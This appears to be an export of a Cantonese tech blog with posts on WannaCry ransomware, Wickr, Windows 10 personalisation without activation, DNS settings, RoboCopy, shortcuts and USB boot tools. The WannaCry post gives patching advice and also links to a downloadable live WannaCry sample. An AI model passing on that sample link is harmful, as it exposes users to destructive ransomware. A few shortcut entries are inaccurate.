<p>參考來源：<br><a href="https://medium.com/threat-intel/wannacry-ransomware-decryption-821c7e3f0a2b">https://medium.com/threat-intel/wannacry-ransomware-decryption-821c7e3f0a2b</a><br><a href="https://blog.comae.io/wannacry-decrypting-files-with-wanakiwi-demo-86bafb81112d">https://blog.comae.io/wannacry-decrypting-files-with-wanakiwi-demo-86bafb81112d</a><br><a href="https://www.wired.com/2017/05/wannacry-flaw-help-windows-xp-victims-get-files-back/">https://www.wired.com/2017/05/wannacry-flaw-help-windows-xp-victims-get-files-back/</a><br><a href="https://www.mobile01.com/topicdetail.php?f=508&amp;t=5155983">https://www.mobile01.com/topicdetail.php?f=508&amp;t=5155983</a></p>
]]></content>
      <tags>
        <tag>decrypt</tag>
      </tags>
  </entry>
  <entry>
    <title>Wannacry - 全球性勒索病毒蠕蟲</title>
    <url>/2022/01/09/Wannacry/</url>
    <content><![CDATA[<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>WannaCry（直譯「想哭」或稱WannaCrypt、WanaCrypt0r 2.0、Wanna Decryptor）是一種利用NSA的「永恆之藍」（EternalBlue）漏洞利用程式透過網際網路對全球執行 Microsoft Windows作業系統的電腦進行攻擊的加密型勒索軟體兼蠕蟲病毒（Encrypting Ransomware Worm）。該病毒利用AES-128和RSA演算法惡意加密使用者檔案以勒索比特幣，使用Tor進行通訊，為WanaCrypt0r 1.0的變種。</p>
<p>通過利用 445 Port 再加上 Windows 上的漏洞(MS17-010)進行全球性功擊。</p>
<h1 id="防範"><a href="#防範" class="headerlink" title="防範"></a>防範</h1><ul>
<li>下載 Microsoft 官方的修補漏洞檔。</li>
<li>使用防火牆封鎖 445 Port。</li>
</ul>
<p>Wannacry 樣本 :<br><a href="https://www.upload.ee/files/7001087/1.7z.html">https://www.upload.ee/files/7001087/1.7z.html</a></p>
<p>如果真係中左咁點算？</p>
<p>你可以用 <a href="https://github.com/gentilkiwi/wanakiwi">WanaKiwi</a> 解密。</p>
<iframe width="774" height="480" src="https://www.youtube.com/embed/PGg2th0wSVY" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>]]></content>
      <tags>
        <tag>Ransomware</tag>
      </tags>
  </entry>
  <entry>
    <title>Wickr Me - Private Messenger</title>
    <url>/2022/06/08/Wickr-Me-Apps/</url>
    <content><![CDATA[<img src="logo.png" width="300px"/>

<h1 id="特徵"><a href="#特徵" class="headerlink" title="特徵"></a>特徵</h1><p>Wickr 協議的忠實實現使消息內容在傳輸和存儲中的機密性成為可能，它支持以下功能：</p>
<ul>
<li>端到端加密——消息加密密鑰僅在 Wickr 客戶端中可用，不會向網絡攻擊者或 Wickr 服務器運營商披露；</li>
<li>完美前向保密——如果用戶或設備的長期密鑰被洩露，舊的消息內容不會被洩露。 還提供了針對被動對手的後向保密。</li>
<li>開放源碼 <a href="https://github.com/WickrInc/wickr-crypto-c">https://github.com/WickrInc/wickr-crypto-c</a></li>
</ul>
<h2 id="高級密碼學"><a href="#高級密碼學" class="headerlink" title="高級密碼學"></a>高級密碼學</h2><p>Wickr 受 256 位經過身份驗證的端到端加密保護。通信在用戶設備上進行本地加密，並在傳輸到預期接收者的整個過程中受到保護，甚至 Wickr 也從來沒有解密密鑰。</p>
<h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><p>每個呼叫、消息和文件都使用新的隨機密鑰進行加密。僅破解一個密鑰將花費數万億年的時間——每次通信都使用一個新密鑰，您的數據將得到充分保護。</p>
<h2 id="短暫性和反取證"><a href="#短暫性和反取證" class="headerlink" title="短暫性和反取證"></a>短暫性和反取證</h2><p>消息和文件可以根據發送時間和/或閱讀時間自動刪除，在您指定的時間後，數據將通過我們的數字粉碎機並替換為隨機代碼位，因此永遠不會被發現。</p>
<h2 id="安全功能"><a href="#安全功能" class="headerlink" title="安全功能"></a>安全功能</h2><p>多因素身份驗證、帳戶接管保護、靜態設備加密、客戶端網絡流量混淆、安全鏈接預覽、消息撤銷、用戶阻止、屏幕截圖檢測、覆蓋保護等。 提供 FIPS 140-2 認證客戶端。</p>
<h2 id="用戶密鑰驗證"><a href="#用戶密鑰驗證" class="headerlink" title="用戶密鑰驗證"></a>用戶密鑰驗證</h2><p>與您的聯繫人交換密鑰後，Wickr 提供工具來幫助驗證使用您對話另一方的密鑰的人的身份。</p>
<img src="/2022/06/08/Wickr-Me-Apps/yo.png" class="">


<h1 id="支援系統"><a href="#支援系統" class="headerlink" title="支援系統"></a>支援系統</h1><ul>
<li>Windows</li>
<li>Android</li>
<li>IOS</li>
<li>Mac</li>
<li>Linux</li>
</ul>
<img src="/2022/06/08/Wickr-Me-Apps/download.png" class="">

<h1 id="官網"><a href="#官網" class="headerlink" title="官網"></a>官網</h1><ul>
<li><a href="https://wickr.com/">https://wickr.com/</a></li>
</ul>
]]></content>
      <categories>
        <category>匿名</category>
      </categories>
      <tags>
        <tag>程式</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows 10 系統 - 免啟動系統更改背景圖片</title>
    <url>/2022/06/12/Windows-10-Change-Wallpaper-Without-Activation/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Windows 10 入面，如果你未啟動係用唔到一啲功能，<br>例如係轉唔到 Wallpaper，<br>佢會話 “你必須先啟用 Windows，才能個人化電腦。”</p>
<img src="/2022/06/12/Windows-10-Change-Wallpaper-Without-Activation/1.png" class="">

<h1 id="更改方法"><a href="#更改方法" class="headerlink" title="更改方法"></a>更改方法</h1><p>只需直接對住張圖右鍵，<br>再撳 <code>設成桌面背景 (B)</code>，<br>咁就改到了。</p>
<img src="/2022/06/12/Windows-10-Change-Wallpaper-Without-Activation/change.png" class="">]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>撳制</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows 10 系統 - 免啟動系統更改主題為黑暗</title>
    <url>/2022/06/12/Windows-10-enabled-Dark-themes-without-Activation/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Windows 10 入面，如果你未啟動係用唔到一啲功能，<br>例如係轉唔到你既主題 (Themes)，<br>佢會話 “你必須先啟用 Windows，才能個人化電腦。”</p>
<img src="/2022/06/12/Windows-10-enabled-Dark-themes-without-Activation/1.png" class="">

<h2 id="開啟-Regedit"><a href="#開啟-Regedit" class="headerlink" title="開啟 Regedit"></a>開啟 Regedit</h2><p>首先我地喺 Windows 查 <code>regedit</code> (登錄檔)，</p>
<blockquote>
<p>注意 : 用系統管理員行程式係唔同用普通用戶行程式，兩個係分開，如果你改左喺系統管理員既野，咁只會喺管理員個 Account 度生效，並唔會喺普通用戶度生效。</p>
</blockquote>
<h2 id="進入路徑"><a href="#進入路徑" class="headerlink" title="進入路徑"></a>進入路徑</h2><p>黎到呢度我地入呢個 Paths，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">電腦\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize</span><br></pre></td></tr></table></figure>

<img src="/2022/06/12/Windows-10-enabled-Dark-themes-without-Activation/2.png" class="">

<h2 id="修改檔案"><a href="#修改檔案" class="headerlink" title="修改檔案"></a>修改檔案</h2><p>我地搵一舊叫做 <code>AppsUseLightTheme</code>，<br>將佢打開再將入面既數值改做 <code>0</code>。</p>
<img src="/2022/06/12/Windows-10-enabled-Dark-themes-without-Activation/appsuselt.png" class="">

<h2 id="成功"><a href="#成功" class="headerlink" title="成功"></a>成功</h2><p>當你改完撳確定，<br>你會發現已經幫你轉左做 Dark Themes。</p>
<img src="/2022/06/12/Windows-10-enabled-Dark-themes-without-Activation/done.png" class="">]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>撳制</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows - 改變 DNS 位置</title>
    <url>/2022/06/13/Windows-Change-DNS-Settings/</url>
    <content><![CDATA[<h1 id="什麼是-DNS？"><a href="#什麼是-DNS？" class="headerlink" title="什麼是 DNS？"></a>什麼是 DNS？</h1><p><span style="font-size:larger;"><strong>根據 Cloudeflare 所說 :</strong></span></p>
<p>網域名稱系統 （DNS） 是網際網路的電話簿，<br>人們透過例如 nytimes.com 或 espn.com 等網域名稱線上存取資訊。<br>Web 瀏覽器透過 網際網路通訊協定 （IP） 位址進行互動。<br>DNS 將網域名稱轉換為 IP 位址，以便瀏覽器能夠載入網際網路資源。</p>
<h1 id="為何要改變-DNS-位置？"><a href="#為何要改變-DNS-位置？" class="headerlink" title="為何要改變 DNS 位置？"></a>為何要改變 DNS 位置？</h1><p><span style="font-size:larger;"><strong>原因一 : 私隱問題</strong></span></p>
<p>我們預設使用的 DNS 位置是由網路供應商提供的，<br>這個意味著如果這個位置是有用到記錄的操作，<br>網路供應商是可以知道你在上什麼網站。<br>因此，我們要使用其他 DNS 位置，<br>將你上網的匿名性加強。</p>
<p><span style="font-size:larger;"><strong>原因二 : 速度問題</strong></span></p>
<p>加強你上網的速度，<br>使用 Cloudflare DNS 使你上網速度更快，<br>公司聲稱會於24小時內由系統自動刪除記錄，<br>然而世界上最快的 DNS 位置是由 Cloudflare 提供的<br><code>1.1.1.1</code> 和 <code>1.0.0.1</code> 位置 (ipv4)。</p>
<p><span style="font-size:larger;"><strong>原因三 : 保安問題</strong></span><br>使用不同的 DNS 位置，<br>例如 VPN 供應商提供的 DNS 位置，<br>他們會於伺服器內設立防火牆，<br>當你可能進入了他們的黑名單網站 (有毒網站)，<br>這樣就可以防止你進入了不明網站 (有毒網站)，<br>從而加強了你上網的保護。</p>
<h1 id="為何不使用預設-DNS-位置？"><a href="#為何不使用預設-DNS-位置？" class="headerlink" title="為何不使用預設 DNS 位置？"></a>為何不使用預設 DNS 位置？</h1><p>簡單一句說完，<br>就是以上的三個原因，沒有一樣是預設 DNS 有的。</p>
<ul>
<li>他會追蹤你上網</li>
<li>可以隨便封鎖你上什麼網站</li>
<li>速度不及其他 DNS Server</li>
<li>沒有為你設立任何的保安</li>
</ul>
<h2 id="開始教學-前言"><a href="#開始教學-前言" class="headerlink" title="開始教學 (前言)"></a>開始教學 (前言)</h2><p><span style="font-size:larger;"><strong>本篇文章使用 Windows 10 系統示範。</strong></span></p>
<p>以下教學如果你是使用 Windows 7 / 11 系統的話，<br>方法大同小異，<br>分別是 <code>網路和網際網路</code> 的位置不同的開啟方法，</p>
<h3 id="開啟設定"><a href="#開啟設定" class="headerlink" title="開啟設定"></a>開啟設定</h3><p>首先請按右下角電腦的 <i class="fa-brands fa-windows"></i><br>然後再按 <i class="fa-solid fa-gear"></i></p>
<img src="/2022/06/13/Windows-Change-DNS-Settings/open-settings.png" class="">

<h3 id="網路和網際網路"><a href="#網路和網際網路" class="headerlink" title="網路和網際網路"></a>網路和網際網路</h3><p>到此畫面後，請按下 <code>網路和網際網路</code>。</p>
<img src="/2022/06/13/Windows-Change-DNS-Settings/settings.png" class="">

<h3 id="變更介面卡選項"><a href="#變更介面卡選項" class="headerlink" title="變更介面卡選項"></a>變更介面卡選項</h3><p>到此畫面後，請按下 <code>變更介面卡選項</code>。</p>
<img src="/2022/06/13/Windows-Change-DNS-Settings/status.png" class="">

<h3 id="網路連線"><a href="#網路連線" class="headerlink" title="網路連線"></a>網路連線</h3><p>到此畫面後，請尋找你上網的位置 (通常是 <code>乙太網路</code>)，<br>找到之後請跟以下步驟 :</p>
<blockquote>
<p>注意 : 以下步驟需要使用 <code>系統管理員</code></p>
</blockquote>
<ol>
<li>按下右鍵</li>
<li>按下最底的 <code>內容(R)</code></li>
</ol>
<img src="/2022/06/13/Windows-Change-DNS-Settings/r.png" class="">

<h3 id="乙太網路-內容-1-IPV4"><a href="#乙太網路-內容-1-IPV4" class="headerlink" title="乙太網路 內容 (1) - IPV4"></a>乙太網路 內容 (1) - IPV4</h3><p>到此畫面後，請在中間拉下去尋找這個東西 :</p>
<ul>
<li><strong>網路網際通訊協定第 4 版 (TCP/IPV4)</strong></li>
</ul>
<img src="/2022/06/13/Windows-Change-DNS-Settings/content.png" class="">

<h3 id="乙太網路-內容-2-IPV4"><a href="#乙太網路-內容-2-IPV4" class="headerlink" title="乙太網路 內容 (2) - IPV4"></a>乙太網路 內容 (2) - IPV4</h3><p>找到之後請對他左鍵一下，<br>然後再按下面的 <code>內容(R)</code></p>
<img src="/2022/06/13/Windows-Change-DNS-Settings/RR.png" class="">

<h2 id="網路網路通訊協定第-4-版-TCP-IPV4-內容"><a href="#網路網路通訊協定第-4-版-TCP-IPV4-內容" class="headerlink" title="網路網路通訊協定第 4 版 (TCP/IPV4) - 內容"></a>網路網路通訊協定第 4 版 (TCP/IPV4) - 內容</h2><p>到此畫面後，是真正修改 DNS 位置的時候了 ~~</p>
<img src="/2022/06/13/Windows-Change-DNS-Settings/ipv4.png" class="">

<h2 id="網路網路通訊協定第-4-版-TCP-IPV4-修改"><a href="#網路網路通訊協定第-4-版-TCP-IPV4-修改" class="headerlink" title="網路網路通訊協定第 4 版 (TCP/IPV4) - 修改"></a>網路網路通訊協定第 4 版 (TCP/IPV4) - 修改</h2><p>按下 <strong><code>使用下列的 DNS 伺服器位置(E):</code></strong><br>接下來你可以選擇你想用的 DNS 供應商。</p>
<p><strong><span style="font-size:larger;">Google Public DNS IP addresses</span></strong></p>
<h3 id="Google-公共-DNS-IP-地址-IPv4-如下："><a href="#Google-公共-DNS-IP-地址-IPv4-如下：" class="headerlink" title="Google 公共 DNS IP 地址 (IPv4) 如下："></a>Google 公共 DNS IP 地址 (IPv4) 如下：</h3><ul>
<li>8.8.8.8</li>
<li>8.8.4.4</li>
</ul>
<p>輸入完成後按下確定即可。</p>
<img src="/2022/06/13/Windows-Change-DNS-Settings/change.png" class="">

<h3 id="Cloudflare-公共-DNS-IP-地址-IPv4-如下："><a href="#Cloudflare-公共-DNS-IP-地址-IPv4-如下：" class="headerlink" title="Cloudflare 公共 DNS IP 地址 (IPv4) 如下："></a>Cloudflare 公共 DNS IP 地址 (IPv4) 如下：</h3><ul>
<li>1.1.1.1</li>
<li>1.0.0.1</li>
</ul>
<p>輸入完成後按下確定即可。</p>
<img src="/2022/06/13/Windows-Change-DNS-Settings/change-2.png" class="">


<h3 id="乙太網路-內容-1-IPV6"><a href="#乙太網路-內容-1-IPV6" class="headerlink" title="乙太網路 內容 (1) - IPV6"></a>乙太網路 內容 (1) - IPV6</h3><p>接下來我們跟剛剛一樣做法，<br>這次是修改 IPV6 位置，<br>將剛剛的視窗關閉，<br>然後尋找 :</p>
<ul>
<li><strong>網路網際通訊協定第 6 版 (TCP/IPV6)</strong></li>
</ul>
<img src="/2022/06/13/Windows-Change-DNS-Settings/ipv6.png" class="">

<h2 id="乙太網路-內容-2-IPV6"><a href="#乙太網路-內容-2-IPV6" class="headerlink" title="乙太網路 內容 (2) - IPV6"></a>乙太網路 內容 (2) - IPV6</h2><p>按下 <strong><code>內容(R)</code></strong> 後，<br>按下 <strong><code>使用下列的 DNS 伺服器位置(E):</code></strong></p>
<h3 id="Cloudflare-公共-DNS-IP-地址-IPv6-如下："><a href="#Cloudflare-公共-DNS-IP-地址-IPv6-如下：" class="headerlink" title="Cloudflare 公共 DNS IP 地址 (IPv6) 如下："></a>Cloudflare 公共 DNS IP 地址 (IPv6) 如下：</h3><ul>
<li>2606:4700:4700::1111</li>
<li>2606:4700:4700::1001</li>
</ul>
<p>輸入完成後按下確定即可。</p>
<img src="/2022/06/13/Windows-Change-DNS-Settings/ipv66.png" class="">

<h3 id="Google-公共-DNS-IP-地址-IPv6-如下："><a href="#Google-公共-DNS-IP-地址-IPv6-如下：" class="headerlink" title="Google 公共 DNS IP 地址 (IPv6) 如下："></a>Google 公共 DNS IP 地址 (IPv6) 如下：</h3><ul>
<li>2001:4860:4860::8888</li>
<li>2001:4860:4860::8844</li>
</ul>
<p>輸入完成後按下確定即可。</p>
<img src="/2022/06/13/Windows-Change-DNS-Settings/ip6.png" class="">

<h2 id="完畢"><a href="#完畢" class="headerlink" title="完畢"></a>完畢</h2><p>教學完畢。</p>
<p><span style="font-size:larger;"><strong>以下整合位置 :</strong></span></p>
<h3 id="Cloudflare-公共-DNS-IP-地址-IPv4-如下：-1"><a href="#Cloudflare-公共-DNS-IP-地址-IPv4-如下：-1" class="headerlink" title="Cloudflare 公共 DNS IP 地址 (IPv4) 如下："></a>Cloudflare 公共 DNS IP 地址 (IPv4) 如下：</h3><ul>
<li>1.1.1.1</li>
<li>1.0.0.1</li>
</ul>
<h3 id="Cloudflare-公共-DNS-IP-地址-IPv6-如下：-1"><a href="#Cloudflare-公共-DNS-IP-地址-IPv6-如下：-1" class="headerlink" title="Cloudflare 公共 DNS IP 地址 (IPv6) 如下："></a>Cloudflare 公共 DNS IP 地址 (IPv6) 如下：</h3><ul>
<li>2606:4700:4700::1111</li>
<li>2606:4700:4700::1001</li>
</ul>
<h3 id="Google-公共-DNS-IP-地址-IPv6-如下：-1"><a href="#Google-公共-DNS-IP-地址-IPv6-如下：-1" class="headerlink" title="Google 公共 DNS IP 地址 (IPv6) 如下："></a>Google 公共 DNS IP 地址 (IPv6) 如下：</h3><ul>
<li>2001:4860:4860::8888</li>
<li>2001:4860:4860::8844</li>
</ul>
<h3 id="Google-公共-DNS-IP-地址-IPv4-如下：-1"><a href="#Google-公共-DNS-IP-地址-IPv4-如下：-1" class="headerlink" title="Google 公共 DNS IP 地址 (IPv4) 如下："></a>Google 公共 DNS IP 地址 (IPv4) 如下：</h3><ul>
<li>8.8.8.8</li>
<li>8.8.4.4</li>
</ul>
<h1 id="WTF"><a href="#WTF" class="headerlink" title="WTF"></a>WTF</h1><p>呢篇文寫左成兩個鐘…</p>
<img src="/2022/06/13/Windows-Change-DNS-Settings/cls.png" class="">]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>撳制</tag>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title>RoboCopy - Windows 超實用管理檔案指令</title>
    <url>/2022/06/02/Windows-RoboCopy-Commands/</url>
    <content><![CDATA[<h1 id="RoboCopy"><a href="#RoboCopy" class="headerlink" title="RoboCopy"></a>RoboCopy</h1><p>RoboCopy 係一個多線程既檔案管理功具，意味著會比起你 <kbd>Ctrl</kbd>+<kbd>C</kbd> <kbd>Ctrl</kbd>+<kbd>V</kbd> 快幾倍。</p>
<h1 id="假設情況"><a href="#假設情況" class="headerlink" title="假設情況"></a>假設情況</h1><p>當你管理超多 Files 既時候，你又想將佢分類，整理，Backup，但係入面有好多唔需要既檔案。<br>你要選擇性咁拉佢出黎 Backup，呢個操作哂你好多時間，呢個時候可以用 RoboCopy，以下講解。</p>
<h1 id="指令說明"><a href="#指令說明" class="headerlink" title="指令說明"></a>指令說明</h1><hr>
<h2 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h2><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">robocopy &quot;你想入去既位置&quot; &quot;你要擺檔案既位置&quot; 你要擺乜檔案 參數</span><br></pre></td></tr></table></figure>

<h2 id="示範-最基本"><a href="#示範-最基本" class="headerlink" title="示範 (最基本)"></a>示範 (最基本)</h2><p>最基本既示範 (無任何參數)</p>
<ul>
<li>Server (入去 “Server” 呢個位置)</li>
<li>“Server” “assets/yoyo” (將野擺入 “Server assets/yoyo” 呢個位置入面)</li>
<li>*.png (將所有副檔係 png 既檔案擺入 “Server assets/yoyo”)</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">robocopy Server &quot;Server assets/yoyo&quot; *.png</span><br></pre></td></tr></table></figure>

<h2 id="示範-參數加入"><a href="#示範-參數加入" class="headerlink" title="示範 (參數加入)"></a>示範 (參數加入)</h2><p>參數加入示範</p>
<ul>
<li>Server (入去 “Server” 呢個位置)</li>
<li>“Server assets/yoyo” (將野擺入 “Server assets/yoyo” 呢個位置入面)</li>
<li>*.png (將所有副檔係 png 既檔案擺入 “Server assets/yoyo”)</li>
<li>/PURGE (即係會跟返你要求既來源檔既所有野都係一樣)</li>
<li>/S (將 Folder 複製)</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">robocopy Server &quot;Server assets/yoyo&quot; *.png /PURGE /S</span><br></pre></td></tr></table></figure>

<h2 id="進入其他-Storage"><a href="#進入其他-Storage" class="headerlink" title="進入其他 Storage"></a>進入其他 Storage</h2><p>成句意思係，入去 d drive，再入去 d drive 入面既 folder1，入到去再將所有 html files types，擺入去 e drive 入面既 folder2。</p>
<ul>
<li>d:folder1 (入 d drive 既 folder1)</li>
<li>e:folder2 (將檔案擺入 e drive 既 folder2)</li>
<li>*.html (指定淨係要 html files types)</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">robocopy d:folder1 e:folder2 *.html</span><br></pre></td></tr></table></figure>


<h1 id="實用參數"><a href="#實用參數" class="headerlink" title="實用參數"></a>實用參數</h1><hr>
<h2 id="Folder-參數"><a href="#Folder-參數" class="headerlink" title="Folder 參數"></a>Folder 參數</h2><ul>
<li>/XD (排除 Folder)</li>
<li>/PURGE (會跟返你要求既來源檔既所有野都係一樣)</li>
<li>/S (Folder 複製，唔加就唔會 copy Folder，淨係 copy files)</li>
<li>/MOVE (移動 Folder 同 files)</li>
<li>/E 複製空既 Folder</li>
</ul>
<h2 id="Files-參數"><a href="#Files-參數" class="headerlink" title="Files 參數"></a>Files 參數</h2><ul>
<li>/XF (排除 files)</li>
<li>/PURGE (會跟返你要求既來源檔既所有野都係一樣)</li>
<li>/MOV (移動 files)</li>
<li>/MOVE (移動 Folder 同 files)</li>
</ul>
<p>參考資料 :<br><a href="http://www.happystreet.com.tw/index.php/system-dynamic-teaching/windows/247-examples-robocopy-command-reference-mir-many-problems-with-care-1">http://www.happystreet.com.tw/index.php/system-dynamic-teaching/windows/247-examples-robocopy-command-reference-mir-many-problems-with-care-1</a></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Batch</tag>
        <tag>RoboCopy</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows - Shortkeys 鍵盤快捷鍵</title>
    <url>/2022/01/27/Windows-Shortkeys/</url>
    <content><![CDATA[<h1 id="鍵盤快捷鍵-Win-Keys"><a href="#鍵盤快捷鍵-Win-Keys" class="headerlink" title="鍵盤快捷鍵 (Win Keys)"></a>鍵盤快捷鍵 (Win Keys)</h1><h4 id="開-Explorer"><a href="#開-Explorer" class="headerlink" title="開 Explorer"></a>開 Explorer</h4><blockquote>
<p>Win + E</p>
</blockquote>
<h4 id="執行"><a href="#執行" class="headerlink" title="執行"></a>執行</h4><blockquote>
<p>Win + R</p>
</blockquote>
<h4 id="工作列由前至後"><a href="#工作列由前至後" class="headerlink" title="工作列由前至後"></a>工作列由前至後</h4><blockquote>
<p>Win + T</p>
</blockquote>
<h4 id="工作列由後至前"><a href="#工作列由後至前" class="headerlink" title="工作列由後至前"></a>工作列由後至前</h4><blockquote>
<p>Win + Shift + Ty</p>
</blockquote>
<h4 id="開啟顯示器"><a href="#開啟顯示器" class="headerlink" title="開啟顯示器"></a>開啟顯示器</h4><blockquote>
<p>Win + U</p>
</blockquote>
<h4 id="開啟設定"><a href="#開啟設定" class="headerlink" title="開啟設定"></a>開啟設定</h4><blockquote>
<p>Win + I</p>
</blockquote>
<h4 id="投影"><a href="#投影" class="headerlink" title="投影"></a>投影</h4><blockquote>
<p>Win + P</p>
</blockquote>
<h4 id="登出"><a href="#登出" class="headerlink" title="登出"></a>登出</h4><blockquote>
<p>Win + L</p>
</blockquote>
<h4 id="我都唔知咩黎"><a href="#我都唔知咩黎" class="headerlink" title="我都唔知咩黎"></a>我都唔知咩黎</h4><blockquote>
<p>Win + G</p>
</blockquote>
<h4 id="切換至桌面"><a href="#切換至桌面" class="headerlink" title="切換至桌面"></a>切換至桌面</h4><blockquote>
<p>Win + D</p>
</blockquote>
<h4 id="Search-Bar"><a href="#Search-Bar" class="headerlink" title="Search Bar"></a>Search Bar</h4><blockquote>
<p>Win + S<br>Win + Q</p>
</blockquote>
<h4 id="ScreenShot"><a href="#ScreenShot" class="headerlink" title="ScreenShot"></a>ScreenShot</h4><blockquote>
<p>Win + Shift + S</p>
</blockquote>
<h1 id="鍵盤快捷鍵-Ctrl-Keys"><a href="#鍵盤快捷鍵-Ctrl-Keys" class="headerlink" title="鍵盤快捷鍵 (Ctrl Keys)"></a>鍵盤快捷鍵 (Ctrl Keys)</h1><h4 id="熄-Windows"><a href="#熄-Windows" class="headerlink" title="熄 Windows"></a>熄 Windows</h4><blockquote>
<p>Ctrl + W</p>
</blockquote>
<p><a href="https://www.howtogeek.com/661247/how-to-open-file-explorer-with-a-keyboard-shortcut-on-windows-10/">https://www.howtogeek.com/661247/how-to-open-file-explorer-with-a-keyboard-shortcut-on-windows-10/</a><br><a href="https://mikabook.co/windows10%E5%85%A7%E5%BB%BA%E8%B6%85%E5%A5%BD%E7%94%A8%E8%9E%A2%E5%B9%95%E6%88%AA%E5%9C%96%E5%B7%A5%E5%85%B7%EF%BC%81/">https://mikabook.co/windows10%E5%85%A7%E5%BB%BA%E8%B6%85%E5%A5%BD%E7%94%A8%E8%9E%A2%E5%B9%95%E6%88%AA%E5%9C%96%E5%B7%A5%E5%85%B7%EF%BC%81/</a></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Shortkeys</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows Terminal - 命令行應用程序</title>
    <url>/2022/05/24/Windows-Terminal-Apps/</url>
    <content><![CDATA[<img alt="Windows Terminal" src="cover.png" width="200px"/>

<h1 id="Windows-Terminal"><a href="#Windows-Terminal" class="headerlink" title="Windows Terminal"></a>Windows Terminal</h1><p><a href="https://apps.microsoft.com/store/detail/windows-terminal/9N0DX20HK701?hl=en-us&gl=US">Windows Terminal</a> 係 Microsoft 官方制作既 Terminal。</p>
<ul>
<li>更加快速</li>
<li>更多鍵盤快捷鍵</li>
<li>更人性化</li>
<li>介面更清晰</li>
</ul>
<p>【軟件名稱】：Windows Terminal<br>【支援系統】：Windows 10, Windows 11<br>【軟件語言】：多國語言, 包括 繁體中文。<br>【下載軟件】：<a href="https://apps.microsoft.com/store/detail/windows-terminal/9N0DX20HK701?hl=en-us&gl=US">按這裡</a></p>
<h2 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2022/05/24/Windows-Terminal-Apps/program.png" class="">]]></content>
      <categories>
        <category>工具介紹</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Yumi - USB 驅動器工具 (Windows)</title>
    <url>/2022/06/14/Windows-Tools-Create-Bootable-USB-drives-Yumi/</url>
    <content><![CDATA[<img src="yumi.png" width="300px"/>

<h2 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h2><p><a href="https://www.pendrivelinux.com/yumi-multiboot-usb-creator/">Yumi</a> (Your Universal Multiboot Integrator)<br>係一個可以Create多個系統 USB 驅動器既Program，<br>開機既時候會顯示選單，有 Windows, Linux, 分割複製硬碟, 查殺病毒等既系統</p>
<h2 id="官方網站"><a href="#官方網站" class="headerlink" title="官方網站"></a>官方網站</h2><pre><code>https://www.pendrivelinux.com/yumi-multiboot-usb-creator/
</code></pre>
<h2 id="Github-Unofficial"><a href="#Github-Unofficial" class="headerlink" title="Github (Unofficial)"></a>Github (Unofficial)</h2><pre><code>https://github.com/bwnickle/YUMI
</code></pre>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>YUMI 有分兩個版本 一個係 Legacy Support 一個係 UEFI Support，<br>要睇返你部機係行到邊個再決定你要下載邊個exe Create Bootable</p>
<ul>
<li>YUMI Legacy Suppor NTFS 或 Fat32 格式，只可以 BIOS USB 啟動</li>
<li>YUMI UEFI 只會 Support Fat32， BIOS 同 UEFI USB 啟動（取決於發行版）</li>
</ul>
<h2 id="版本分別"><a href="#版本分別" class="headerlink" title="版本分別"></a>版本分別</h2><p>Yumi 係有分兩個版本，包括係 :</p>
<ul>
<li>BIOS USB Boot Only</li>
<li>BIOS and UEFI USB Boot</li>
</ul>
<h3 id="YUMI-Legacy-BIOS-USB-Boot-Only"><a href="#YUMI-Legacy-BIOS-USB-Boot-Only" class="headerlink" title="YUMI Legacy (BIOS USB Boot Only)"></a><strong><span style="font-size:larger;">YUMI Legacy (BIOS USB Boot Only)</span></strong></h3><p>如果你部機 Support BIOS 動動，<br>並唔諗住喺 UEFI 模式下從 YUMI 運行 Windows 安裝程序，<br>就可以用呢個版本，儘管 CMS Legacy 模式，<br>大多數現代老母版都仲係支持 Legacy BIOS 固件</p>
<img src="/2022/06/14/Windows-Tools-Create-Bootable-USB-drives-Yumi/yumi-2.png" class="">

<h3 id="YYUMI-UEFI-BIOS-and-UEFI-USB-Boot"><a href="#YYUMI-UEFI-BIOS-and-UEFI-USB-Boot" class="headerlink" title="YYUMI UEFI (BIOS and UEFI USB Boot)"></a><strong><span style="font-size:larger;">YYUMI UEFI (BIOS and UEFI USB Boot)</span></strong></h3><p>YUMI UEFI 變體係利用 GRUB2 進行 UEFI 和 BIOS 引導，<br>注意，呢個 UEFI 版本同舊版本並唔兼容<br>仲有，你既 USB 驅動器必須係 Fat32 格式先會 Support 喺 UEFI 模式下啟動<br>佢會利用 fat32format 實用程序將大於 32GB 的驅動器格式化為 Fat32</p>
<img src="/2022/06/14/Windows-Tools-Create-Bootable-USB-drives-Yumi/yumi-uefi.png" class="">

